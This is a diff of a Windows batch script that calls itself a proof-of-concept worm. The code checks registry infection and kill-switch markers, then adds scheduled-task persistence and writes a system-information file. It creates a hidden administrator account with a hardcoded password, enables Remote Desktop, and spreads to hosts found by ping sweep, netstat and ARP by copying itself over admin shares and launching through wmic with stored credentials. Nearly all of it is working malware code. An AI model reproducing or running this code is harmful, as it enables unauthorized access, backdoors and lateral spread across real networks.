@@ -28,12 +28,11 @@
 	)
 	call :init
 	goto :EOF
+	
 :init
 	:: Checks for infection marker if host is already infected.
-
-
-	::buildin Kill switch WIP 14Jan
 	reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v KillSwitch_oOoOo
+	::builtin Kill switch WIP 14Jan
 	if %errorlevel% equ 0 (
 		::call deleteme 
 		exit /b 0
@@ -42,6 +41,7 @@
 		reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v isPresented
 		if %errorlevel% equ 1 (  
 			call :initial_beacon_install
+
 		)
 		if %errorlevel% equ 0 (
 			call :beacon_present_already	
@@ -50,15 +50,12 @@
 	exit /b 0
 
 :initial_beacon_install
-	call :getcreds_setstaticip
-	call :getcreds_pwdump
 	::initial target attack sequence
-	if %errorlevel% equ 0 (
-		call :add_marker
-		call :add_persistence
-		call :execute_action
-		call :prop_seq
-	)
+	call :add_marker
+	call :add_persistence
+	call :execute_action
+	call :prop_seq
+	call :execute_RDPuseradd 
 	exit /b 0
 
 :beacon_present_already
@@ -72,14 +69,6 @@
 	reg add HKLM\SOFTWARE\Microsoft /f /v isPresented /t REG_SZ /d 1
 	exit /b 0
 
-:execute_RDPuseradd 
-	:: User:Pass
-	:: oOoOo:1qaz!QAZ@WSX!QAZ
-	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-	net user oOoOo 1qaz!QAZ@WSX /add /Y
-	net localgroup administrators oOoOo /ADD /Y
-	net LOCALGROUP "Remote Desktop Users" oOoOo /ADD /Y
-
 :add_persistence
 	:: Add task schedule persistence
 	copy /y %~dp0oO°º¤øø¤º°ºøo.bat %ldir%\oO°º¤øø¤º°ºøo.bat
@@ -88,9 +77,7 @@
 
 :execute_action
 	:: Malicious actions go here. This POC leaves a text file with system information.
-	::===========================
 	set pwnfile="%pwnd_dir%\1338¤øø¤_%COMPUTERNAME%.txt
-
 	echo %COMPUTERNAME% SystemInfoStart> %pwnfile%
 	echo.
 	systeminfo | findstr /i "Host"" >> %pwnfile%
@@ -107,6 +94,14 @@
 	echo "=============================================================	" >> %pwnfile%
 	exit /b 0
 
+:execute_RDPuseradd 
+	:: User:Pass
+	:: oOoOo:1qaz!QAZ@WSX!QAZ
+	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+	net user oOoOo 1qaz!QAZ@WSX /add /Y
+	net localgroup administrators oOoOo /ADD /Y
+	net LOCALGROUP "Remote Desktop Users" oOoOo /ADD /Y
+
 :prop_seq
 	call :prop_subnet
 	call :prop_netstat
@@ -117,16 +112,15 @@
 	:: Method 1 - Find and propagate to targets on the same subnet. Does a ping sweep to achieve this.
 	setlocal enabledelayedexpansion
 	for /l %%q in (0,1,255) do (
-
 		set blackip=%octet1%.%octet2%.%octet3%.%%q
 		findstr /IC:"%blackip%" inbound_list.txt
 		if !errorlevel! equ 0 (
 			ping %octet1%.%octet2%.%octet3%.%%q /n 2 /w 500  | findstr Reply | findstr -v unreachable
 				if !errorlevel! equ 0 (
-					for /f "tokens=1-2 delims= " %%x in (%ldir%\1iobct) do (
+					for /f "tokens=1-2 delims= " %%x in (%ldir%\1ioOoi1) do (
 						net use \\%octet1%.%octet2%.%octet3%.%%q\c$ /user:%%x %%y
 						copy /y "%ldir%\oO°º¤øø¤º°ºøo.bat" "\\%octet1%.%octet2%.%octet3%.%%q\c$\Windows\Temp\oO°º¤øø¤º°ºøo.bat"
-						copy /y "%ldir%\1iobct" "\\%octet1%.%octet2%.%octet3%.%%q\c$\Windows\Temp\1iobct"
+						copy /y "%ldir%\1ioOoi1" "\\%octet1%.%octet2%.%octet3%.%%q\c$\Windows\Temp\1ioOoi1"
 						net use /del \\%octet1%.%octet2%.%octet3%.%%q\c$
 						wmic /node:%octet1%.%octet2%.%octet3%.%%q /user:%%x /password:%%y process call create "cmd /c %ldir%\oO°º¤øø¤º°ºøo.bat"
 					)
@@ -146,10 +140,10 @@
 				if !errorlevel! equ 0 (
 					ping %netIp% /n 2 /w 500 |findstr Reply | findstr -v unreachable
 					if !errorlevel! equ 0 (
-						for /f "tokens=1-2 delims= " %%x in (%ldir%\1iobct) do (
+						for /f "tokens=1-2 delims= " %%x in (%ldir%\1ioOoi1) do (
 							net use \\%netIp%\c$ /user:%%x %%y
 							copy /y "%ldir%\oO°º¤øø¤º°ºøo.bat" "\\%netIp%\c$\Windows\Temp\oO°º¤øø¤º°ºøo.bat"
-							copy /y "%ldir%\1iobct" "\\%netIp%\c$\Windows\Temp\1iobct"
+							copy /y "%ldir%\1ioOoi1" "\\%netIp%\c$\Windows\Temp\1ioOoi1"
 							net use /del \\%netIp%\c$
 							wmic /node:%netIp% /user:%%x /password:%%y process call create "cmd /c %ldir%\oO°º¤øø¤º°ºøo.bat"
 						)
@@ -159,6 +153,7 @@
 	)
 	endlocal
 	exit /b 0
+
 :prop_arp
 	:: Method 3 - Find and propagate to targets on ARP tables.
 	setlocal enabledelayedexpansion
@@ -171,7 +166,7 @@
 				if !errorlevel! equ 0 (
 					net use \\%arpIp%\c$ /user:%%x %%y
 					copy /y "%ldir%\oO°º¤øø¤º°ºøo.bat" "\\%arpIp%\c$\Windows\Temp\oO°º¤øø¤º°ºøo.bat"
-					copy /y "%ldir%\1iobct" "\\%arpIp%\c$\Windows\Temp\1iobct"
+					copy /y "%ldir%\1ioOoi1" "\\%arpIp%\c$\Windows\Temp\1ioOoi1"
 					net use /del \\%arpIp%\c$
 					wmic /node:%arpIp% /user:%%x /password:%%y process call create "cmd /c %ldir%\oO°º¤øø¤º°ºøo.bat"
 				)
@@ -180,5 +175,3 @@
 	)
 	endlocal
 	exit /b 0
-
-
